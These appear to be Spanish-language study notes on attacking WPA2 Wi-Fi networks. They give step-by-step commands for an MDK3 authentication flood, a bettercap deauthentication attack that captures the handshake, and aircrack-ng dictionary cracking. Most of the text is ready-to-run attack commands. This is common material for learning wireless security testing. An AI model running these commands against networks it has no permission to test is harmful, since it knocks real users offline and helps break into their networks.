## MDK3
Este ataque lo que hace es generar una n cantidad de clientes ser autenticados en el AC victima, de esta manera saturar la red y que los clientes reales se desconecten provocando que se vuelvan a conectar y capturar el handshake.

Empezamos a capturar todo el trafico del AC para llegar a capturar el Handshake

	airodump-ng -c 6 -w CapturasDeAuth-RedBlack --essid Black wlan1mon

- -c 6 *canal del AC*
-  -w Capturas  *nombre del archivo donde se guardara las capturas*
-  --essid Black *nombre del AC*

Una que empezamos a capturar el trafico realizaremos el ataque, esto empezara a generar miles de clientes falsos tratando de autentificarse al AC

	mdk a -a D0:B6:6F:5A:AC:BD 

- a *tipo de ataque*
- -a *dirección mac del AC*


## BetterCap
Aquí se explica que es la herramienta [[BetterCap]]

	airmon-ng start wlan0
Activamos la tarjeta de red en modo monitor

	bettercap -iface wlan0mon
Iniciamos el bettercap

	wlan0mon# wifi.recon on
Escaneamos los AC disponibles

	events.ignore <evento>
Ignora los eventos que se van surgiendo

	wifi.show 
Muestra los AC  disponibles

	set net.sniff.output CapturasDeAuth.pcap
Especificamos donde guardaremos las capturas cuando hagamos un sniff

	net.sniff on
Empezamos a sniffear todos los AC que tenemos al alcance

	wifi.recon.channel 2
Especificamos el canal del AC que queremos sniffear

	wifi.deauth 68:d7:9a:56:24:c6
Iniciamos el ataque de Auth *global* al AC
-68:d7:9a:56:24:c6 *BSSID del AC*
Debemos de visualizar en los outputs *WPA2 HandShake (FULL)* esto se debe a que se capturo un [[HandShake]]

Ahora una vez que tenemos el handshake, podemos romper el hash con la herramienta de aircrack-ng 

	aircrack-ng -w dicc.txt CapturaDeAuth.pcap
Aquí aplicamos fuerza bruta con aircrack-ng proporcionando un diccionario y la captura del handshake, se desplegara un menú de todo el sniff, solo debemos de proporcionar el id del registro donde se encuesta el handshake.

